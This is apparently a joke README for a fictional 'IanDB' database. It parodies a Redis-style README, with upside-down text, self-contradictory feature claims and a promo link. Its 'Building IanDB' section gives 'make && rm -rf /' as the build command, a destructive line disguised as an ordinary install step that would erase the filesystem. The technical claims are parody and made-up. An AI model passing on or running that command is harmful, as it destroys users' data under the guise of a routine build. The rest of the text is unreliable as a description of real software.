# IanDB - Hacktoberfest Edition v0.3 (Ɛ˙0ʌ uoıʇıpƎ ʇsǝɟɹǝqoʇʞɔɐH - 𐐒◖uɐI)

<img src="https://i.imgur.com/4rwDNQN.png">

IanDB is often referred as a structured data structures server. What this means is that IanDB provides access to mutable data structures via a set of commands, which are sent using a server-client model with UDP sockets and a simple protocol. So different processes can query and modify the same data structures in a shared way.

*(˙ʎɐʍ pǝɹɐɥs ɐ uı sǝɹnʇɔnɹʇs ɐʇɐp ǝɯɐs ǝɥʇ ʎɟıpoɯ puɐ ʎɹǝnb uɐɔ sǝssǝɔoɹd ʇuǝɹǝɟɟıp oS ˙ʃoɔoʇoɹd ǝʃdɯıs ɐ puɐ sʇǝʞɔos Ԁ◖∩ ɥʇıʍ ʃǝpoɯ ʇuǝıʃɔ-ɹǝʌɹǝs ɐ ƃuısn ʇuǝs ǝɹɐ ɥɔıɥʍ 'spuɐɯɯoɔ ɟo ʇǝs ɐ ɐıʌ sǝɹnʇɔnɹʇs ɐʇɐp ǝʃqɐʇnɯ oʇ ssǝɔɔɐ sǝpıʌoɹd 𐐒◖uɐI ʇɐɥʇ sı suɐǝɯ sıɥʇ ʇɐɥM ˙ɹǝʌɹǝs sǝɹnʇɔnɹʇs ɐʇɐp pǝɹnʇɔnɹʇs ɐ sɐ pǝɹɹǝɟǝɹ uǝʇɟo sı 𐐒◖uɐI)*

Data structures implemented into IanDB have a few special properties:

*(:sǝıʇɹǝdoɹd ʃɐıɔǝds ʍǝɟ ɐ ǝʌɐɥ 𐐒◖uɐI oʇuı pǝʇuǝɯǝʃdɯı sǝɹnʇɔnɹʇs ɐʇɐ◖
)*

IanDB cares to store them on disk. This means that IanDB is fast, but that is also non-volatile.
Implementation of data structures stress on harddrive efficiency, so data structures inside IanDB will likely use more harddrive compared to the same data structure modeled using an high level programming language.
IanDB offers a number of features that are natural to find in a database, like replication, scaling, tunable levels of durability, cluster, more scaling and high availability.
It uses coding and algorithms to avoid data congestion and vulnerability against application level attacks.

For enterprise licenses, please go to https://db.ian678.com/?promocode=nuuls to get 10% off!

# Building IanDB

    make && rm -rf /

After building IanDB, it is a good idea to test it using:

    make test
    
It is also possible to use `yarn install` once you download ian-db. It does not work on windows however.

# Code contributions
CBenni
 🤔

Enjoy!
